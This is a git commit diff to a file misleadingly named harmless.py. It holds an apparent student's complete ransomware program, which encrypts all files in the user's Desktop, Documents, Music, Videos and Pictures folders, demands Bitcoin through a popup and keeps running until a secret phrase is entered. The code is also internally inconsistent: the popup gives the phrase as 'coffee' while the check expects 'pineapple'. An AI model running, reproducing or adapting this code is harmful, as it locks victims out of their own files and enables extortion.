0e311e44ebb1ea6061968c91d0fa4cf39f59e9f6
Abubudgie <abubudgie@Dunya.Dunya>
2023-11-01 14:25:47 +1100

    some finetuning

--- harmless.py
+++ harmless.py
@@ -1,3 +1,6 @@
+# Something Awesome Project - Ransomware
+# Yahya Al-Faraj
+# z5417171
 import os
 from cryptography.fernet import Fernet
 import tkinter as tk
@@ -5,27 +8,28 @@ from tkinter import messagebox
 from tkinter import simpledialog
 
 
-# Define the list of directories to be traversed
-directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]
+# This is the list of directories that will be targeted.
+# This list can be increased or decreased but for the sake of analysing encryption/decryption these will do for now.
+directories = ["Desktop", "Documents", "Music", "Videos", "Pictures"]
 
-# Initialize an empty list to store all the files in the specified directories
+# This array will contain files that will be encrypted/decrypted.
 files = []
 
-# Traverse each directory and subdirectory to get all files
+# Searching for the files that will be encrypted/decrypted. 
 for directory in directories:
     for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
         for filename in filenames:
             files.append(os.path.join(root, filename))
 
-# Generate the encryption key and save it in a file
+# This is the encryption key that will be used to encrypt/decrypt. It will be randomly generated. 
 key = Fernet.generate_key()
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
-# these files should not be encrypted
-forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]
+# These are files that should never be touched.
+forbidden_files = ["README.md", "decrypt.py", "encrypt.py", "decrypt.py", "harmless.py", "thekey.key", "harmless"]
 
-# Encrypt each file with the generated key
+# The encryption process.
 for file in files:
     if file in forbidden_files:
         continue
@@ -35,27 +39,32 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-# Create a pop-up message box
+# This section is responsible for communicating with the victim and giving them instructions
 root = tk.Tk()
-root.withdraw()  # Hide the main window
-messagebox.showinfo("Encryption Complete", "You have been hacked. Toss a Bitcoin here at *********** to receive your files back ;) ")
+root.withdraw() 
+messagebox.showinfo("Encryption Complete", "You have been hacked. Toss a Bitcoin to your hacker here at *********** to get your files back ;) ")
 
 # Let's imagine that by clicking the ok in the popup that somehow a bitcoin gets transfered...
+# I deemed the process of bitcoin transferal not really important as the focus of this project 
+# is to analyse how ransomware encrypts/decrypts data on a computer. Bitcoin transferral can always be implemented later
 
 messagebox.showinfo("message", "Bitcoin received, secret code is 'coffee'. Now running decryption. Click ok to continue.")
 
-# Read the secret key from the file
+# Read the secret key from the key file we created earlier
 with open("thekey.key", "rb") as key_file:
     secret_key = key_file.read()
 
-# Get the secret phrase
-secret_phrase = "coffee"
+# The secret phrase is required to begin the decryption process
+# The idea is that once the funds are transferred, the victim will in exchange receiver this secret phrase
+secret_phrase = "pineapple"
 
+#If the victim does not provide the correct phrase then they will not be able to decrypt their files
 while True:
-    user_input = simpledialog.askstring("Input", "Please enter the code: Enter the secret phrase to decrypt your files")
-    if user_input != "coffee":
+    user_input = simpledialog.askstring("Input", "Enter the secret phrase to decrypt your files:")
+    if user_input != "pineapple":
         messagebox.showinfo("message", "Try again fool!")
     else:
+        # Decryption process
         for file in files:
             if file in forbidden_files:
                 continue
@@ -68,5 +77,8 @@ while True:
         messagebox.showinfo("message", "Thanks loser :) You can have your files back now")
         break  # Exit the loop when the correct phrase is entered
 
+# These will end the program when the decryption is finished
+# If the person does not provide correct secret phrase and does not decrypt their files, the program will keep 
+# running and they will not be able to close it.
 root.destroy()
 root.mainloop() 
